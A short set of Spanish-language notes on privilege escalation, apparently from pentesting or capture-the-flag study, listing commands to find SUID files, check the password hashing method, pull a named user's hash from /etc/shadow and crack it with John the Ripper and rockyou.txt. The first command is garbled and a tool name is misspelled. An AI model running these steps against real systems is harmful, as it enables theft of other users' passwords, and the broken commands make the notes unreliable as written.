# Explotación y abuso de privilegios

```bash
  fs \-ps -4000 2>/dev/null
```

- Podemos ver la encriptación de las contraseña
```bash
  cat /etc/login.defs | grep "ENCRYPT_METHOD"
```

- Generamos el hash del usuario que queremos hackear
```bash
  cat /etc/shadow | grep pepito > hash
```

- Luego con la herramienta jonh podemos desencriptar el hash
```bash
  john --wordlist=rockyou.txt hash
```

- Y por ultimo mostramos el hash
```bash 
  jonh --show hash
```

